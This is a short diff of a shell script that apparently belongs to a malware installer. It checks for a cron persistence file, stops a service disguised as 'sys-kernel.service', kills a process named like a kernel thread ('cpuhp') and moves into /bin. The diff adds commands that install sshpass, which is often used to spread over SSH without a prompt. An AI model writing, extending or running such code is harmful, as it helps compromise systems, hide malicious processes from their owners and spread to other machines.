@@ -1,4 +1,6 @@
 if [ ! -f /etc/cron.d/cronextend ]; then
+	apt-get update
+ 	apt-get install sshpass
 	systemctl stop sys-kernel.service
         killall cpuhp
  	cd /bin
